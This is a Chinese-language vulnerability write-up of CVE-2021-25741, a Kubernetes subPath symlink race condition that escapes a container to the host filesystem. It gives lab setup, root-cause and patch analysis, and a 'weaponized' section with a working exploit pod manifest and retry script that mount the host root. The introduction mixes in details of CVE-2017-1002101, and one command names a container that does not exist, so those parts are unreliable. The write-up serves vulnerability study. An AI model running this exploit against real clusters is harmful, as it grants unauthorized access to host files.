# 【CVE-2021-25741】Kubernetes文件系统逃逸漏洞

### 产品介绍

K8S(Kubernetes) 是一个可移植的、可扩展的开源平台，用于管理容器化的工作负载和服务，可促进声明式配置和自动化。 Kubernetes 拥有一个庞大且快速增长的生态系统。Kubernetes 的服务、支持和工具广泛可用。

### 漏洞简介

CVE-2017-1002101是⼀个Kubernetes的文件系统逃逸漏洞，允许攻击者使用 subPath 卷挂载来访问卷空间外的 文件或目录，CVSS 3.x评分为9.8[1]。所有 v1.3.x 、 v1.4.x 、 v1.5.x 、 v1.6.x 及低于 v1.7.14 、 v1.8.9 和 v1.9.4 版本的Kubernetes均受到影响。

### 背景知识

1. subpath

   kubernetes管理的多个容器内的本地文件通常是非持久化的，容器终止后非持久化的文件会丢失，而且不同的容器直接存在共享文件的需要，因此k8s提供了volume来解决这一问题，有时存在把volume在多处使用的情况，subpath特性允许在为容器挂载volume时指定挂载卷内的子路径。

2. 符号链接

   符号链接指linux下的一类文件，包含指向其他文件或目录的引用，操作一个符号链接文件时，操作系统会将我们的操作解析为对所指向文件或目录的操作，通常使用ln命令进行，例如`ln -s target_path link_path`

### 漏洞复现

1. 环境准备

   使用metarget安装1.17.1版本的k8s `sudo ./metarget cnv install cve-2021-25741 --domestic`

   设置隐私策略并应用，限制只能挂载/tmp目录下的文件 `kubectl apply -f psp.yaml`

   ````yaml
   # psp.yaml
   apiVersion: policy/v1beta1
   kind: PodSecurityPolicy
   metadata:
    name: privileged
    annotations:
     seccomp.security.alpha.kubernetes.io/allowedProfileNames: '*'
   spec:
    privileged: true
    allowPrivilegeEscalation: true
    allowedCapabilities:
    - '*'
    volumes:
    - '*'
    allowedHostPaths:
    - pathPrefix: /tmp/
   ````

   应用RBAC `kubectl apply -f rbac1.yaml` `kubectl apply -f rbac2.yaml`

   ````yaml
   # RBAC1.yaml
   apiVersion: rbac.authorization.k8s.io/v1
   kind: ClusterRole
   metadata:
    name: privileged-psp
   rules:
    - apiGroups:
      - policy
      resourceNames:
      - privileged
      resources:
      - podsecuritypolicies
      verbs:
      - use
      
   # RBAC2.yaml
   apiVersion: rbac.authorization.k8s.io/v1
   kind: RoleBinding
   metadata:
    name: kube-system-psp
    namespace: kube-system
   roleRef:
    apiGroup: rbac.authorization.k8s.io
    kind: ClusterRole
    name: privileged-psp
   subjects:
    - apiGroup: rbac.authorization.k8s.io
      kind: Group
      name: system:nodes
    - apiGroup: rbac.authorization.k8s.io
      kind: Group
      name: system:serviceaccounts:kube-system
   
   ````

   然后为API Server配置PodSecurityPolicy插件。编辑API Server的配置⽂件 `/etc/kubernetes/manifests/kube-apiserver.yaml` ，在`--enable-admission-plugins`命令⾏选项后加 上` PodSecurityPolicy` ，然后重启服务 ` service kubelet restart`

   此时创建一个挂载根目录的容器进行测试 `kubectl apply -f testPod.yaml`

   ````yaml
   # testPod.yaml
   apiVersion: v1
   kind: Pod
   metadata:
    name: test
   spec:
    containers:
    - image: ubuntu
      name: test
      volumeMounts:
      - mountPath: /vuln
        name: my-volume
      command: ["sleep"]
      args: ["10000"]
    volumes:
     - name: my-volume
       hostPath:
        path: /
   ````

   无法创建并报错`pods "test" is forbidden: unable to validate against any pod security policy: [spec.volumes[0].hostPath.pathPrefix: Invalid value: "/": is not allowed to be used spec.volumes[0].hostPath.pathPrefix: Invalid value: "/": is not allowed to be used]`表明环境搭建完成，此时无法创建挂载主机根目录的容器

2. 漏洞复现

   多次重复使用exp.yaml创建pod `kubectl apply -f exp.yaml`

   ````yaml
   apiVersion: v1
   kind: Pod
   metadata:
     name: cve202125741
   spec:
     containers:
     - name: prep-container
       image: ubuntu
       command: ["/bin/sh", "-ec", "mkdir /mnt/data/testpath2; ln -s / /mnt/data/testpath1; while true; do ./renameat2 -e /mnt/data/testpath2 /mnt/data/testpath1; done"]
       volumeMounts:
       - name: my-volume
         mountPath: /mnt/data
     - name: my-container
       image: ubuntu
       command: ["/bin/sh", "-ec", "ls /mnt/data; sleep 999999"]
       volumeMounts:
       - mountPath: /mnt/data
         name: my-volume
         subPath: testpath2
     volumes:
     - name: my-volume
       emptyDir: {}
   ````
   
   由于漏洞原理为竞态条件，所以需要多次重复创建等待成功，使用shell编写自动化脚本。

   ````shell
#!/bin/sh
   
   while [ 1 -lt 2 ]
   do
           kubectl apply -f exp.yaml;
           sleep 10; 
           listing=$(kubectl logs cve202125741 my-container);
           if [ "$listing" = "" ];
           then
                   echo 'fail.';
                   kubectl delete -f exp.yaml;
           else
                   echo $listing;
                   echo 'Success!';
                   exit;
           fi
   done
   ````
   
   运行exp.sh后等待成功，发现可以顺利运行容器，此时容器内/mnt/data/目录即为宿主机的根目录
   
   `kubectl exec -i -t cve202125741 -c mount-container -- ls /mnt/data`

### 漏洞分析

````yaml
apiVersion: v1
kind: Pod
metadata:
  name: cve202125741
spec:
  containers:
  - name: prep-container
    image: ubuntu
    command: ["/bin/sh", "-ec", "mkdir /mnt/data/testpath2; ln -s / /mnt/data/testpath1; while true; do ./renameat2 -e /mnt/data/testpath2 /mnt/data/testpath1; done"]
    volumeMounts:
    - name: my-volume
      mountPath: /mnt/data
  - name: my-container
    image: ubuntu
    command: ["/bin/sh", "-ec", "ls /mnt/data; sleep 999999"]
    volumeMounts:
    - mountPath: /mnt/data
      name: my-volume
      subPath: testpath2
  volumes:
  - name: my-volume
    emptyDir: {}
````

* 在cve-2017-1002101的补丁中，已经在全流程中解析了符号链接并且判断解析后的路径是否在卷中，但是最终挂载的部分使用了linux下的mount工具，该工具在默认情况下解析符号链接，此时在k8s判断路径有效传入mount工具的过程中可以变更符号链接指向，使得mount工具将主机的目录挂载进容器中
* 在进行此次攻击时，使用renameat2工具，不断交换testpath2和testpath1的指向，第二个容器挂载testpath2，当k8s校验时testpath2指向卷内目录而传入mount时指向根目录时，即可将根目录挂载到容器内
* ![img](https://lh3.googleusercontent.com/Fb7JNY1-fB2aJd81xl6axtqxBeFG-hT_-knHw6UZEas7OU7g2av8blc6ZmwadIetOEy5cYBNqZYge8sr_G66A04ruxbf9FX10Bfm0sUKbY3JPsz2StBacW8r6qDLCBmPGHPfthtJX5uUasqAJprKh91WCg7yhmQtajCNYVlWaVzhYSos=w640-h174)

### 补丁分析

修复方案中，在调用mount时传递了–no-canonicalize参数，命令mount不再解析符号链接

### 武器化利用

````yaml
# exp.yaml
apiVersion: v1
kind: Pod
metadata:
  name: cve202125741
spec:
  containers:
  - name: prep-container
    image: ubuntu
    command: ["/bin/sh", "-ec", "mkdir /mnt/data/testpath2; ln -s / /mnt/data/testpath1; while true; do ./renameat2 -e /mnt/data/testpath2 /mnt/data/testpath1; done"]
    volumeMounts:
    - name: my-volume
      mountPath: /mnt/data
  - name: my-container
    image: ubuntu
    command: ["/bin/sh", "-ec", "ls /mnt/data; sleep 999999"]
    volumeMounts:
    - mountPath: /mnt/data
      name: my-volume
      subPath: testpath2
  volumes:
  - name: my-volume
    emptyDir: {}
````

````shell
# exp.sh
#!/bin/sh

while [ 1 -lt 2 ]
do
        kubectl apply -f exp.yaml;
        sleep 10; 
        listing=$(kubectl logs cve202125741 my-container);
        if [ "$listing" = "" ];
        then
                echo 'fail.';
                kubectl delete -f exp.yaml;
        else
                echo $listing;
                echo 'Success!';
                exit;
        fi
done
````

运行exp.sh后等待成功，此时主机的根目录已经被挂载进容器的/mnt/data目录，使用`kubectl exec -i -t cve202125741 -c my-container -- /bin/sh`即可访问